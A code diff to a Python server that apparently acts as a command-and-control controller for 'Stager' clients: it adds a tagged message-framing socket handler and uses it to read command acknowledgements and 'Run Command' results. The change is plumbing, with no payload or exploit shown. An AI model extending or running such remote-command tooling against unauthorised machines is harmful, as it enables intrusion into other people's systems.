@@ -32,12 +32,45 @@ class myconstant():
         self.CMD_STAGER_GET_HISTORY = "history"
         self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"
 
-        
-        
 
 class myconstant_networking():
     def __init__(self):
         self.PSRUN_SUCCESS = "PSRUN_SUCCESS"
+
+
+# socket is assume connected
+class mysocket_handler():
+    def __init__(self,in_socket):
+        self.__mysocket = in_socket
+        self.__msg_buf = ""
+        
+        self.__msg_tag_st = "[MYMSST]"
+        self.__msg_tag_ed = "[MYMSED]"
+        #less likely need this
+        self.__enc_tag_st = "[MYENST]"
+        self.__enc_tag_ed = "[MYENED]"
+
+
+    def get_nextmsg(self):
+
+        try_get = True
+        while try_get:
+            # if msg buf is enough
+            if self.__msg_tag_st in self.__msg_buf and self.__msg_tag_ed in self.__msg_buf:
+                #get start tag
+                t_startmsg = self.__msg_buf.find(self.__msg_tag_st)
+                t_endmsg = self.__msg_buf.find(self.__msg_tag_ed)
+                # msg is from startmsg + len(tag) to endmsg
+                r_msg = self.__msg_buf[(t_startmsg + len(self.__msg_tag_st)):t_endmsg]
+                print("[DEBUG] r_msg: {}".format(r_msg))
+                # remove sub string from buf + return
+                self.__msg_buf = self.__msg_buf[(t_endmsg + len(self.__msg_tag_ed)):]
+                return r_msg
+            else:
+                # get more message
+                t_indata = self.__mysocket.recv(1024)
+                self.__msg_buf = self.__msg_buf + t_indata.decode("ascii", "ignore")
+
 
 
 class myserver():
@@ -68,6 +101,9 @@ class myserver():
             item_que = self.__mydata_list[myuuid]
             mysocket = self.__mysocket_list[myuuid]
             myhistory = self.__mymsg_list[myuuid]
+            # make a handler class
+            t_mysockethandler = mysocket_handler(mysocket)
+
             try:
                 cmd_struct_to_send = item_que.get(block=True, timeout=5)
             except queue.Empty:
@@ -79,21 +115,18 @@ class myserver():
                 encode_tag = cmd_struct_to_send[0].encode("ascii", "ignore")
                 send_result = mysocket.send(encode_tag)
                 myhistory.append("[Stager] Total of number to send: {}, Sent: {}".format(len(encode_tag), send_result))
-                recv_result = mysocket.recv(1024)
-                decode_result = recv_result.decode("ascii", "ignore")
-                myhistory.append("[Stager] Send command_tag result: {}".format(decode_result))
+                recv_result = t_mysockethandler.get_nextmsg()
+                myhistory.append("[Stager] Send command_tag result: {}".format(recv_result))
 
                 encode_cmd = cmd_struct_to_send[1].encode("ascii", "ignore")
                 send_result = mysocket.send(encode_cmd)
                 myhistory.append("[Stager] Total of number to send: {}, Sent: {}".format(len(encode_cmd), send_result))
-                recv_result = mysocket.recv(1024)
-                decode_result = recv_result.decode("ascii", "ignore")
-                myhistory.append("[Stager] Send command result: {}".format(decode_result))
+                recv_result = t_mysockethandler.get_nextmsg()
+                myhistory.append("[Stager] Send command result: {}".format(recv_result))
 
                 # try get cmd result if any
-                recv_result = mysocket.recv(1024)
-                decode_result = recv_result.decode("ascii", "ignore")
-                myhistory.append("[Stager] Run Command result: {}".format(decode_result))
+                recv_result = t_mysockethandler.get_nextmsg()
+                myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                 # ack for success
                 encode_cmd = t_net_constant.PSRUN_SUCCESS.encode("ascii", "ignore")
                 send_result = mysocket.send(encode_cmd)
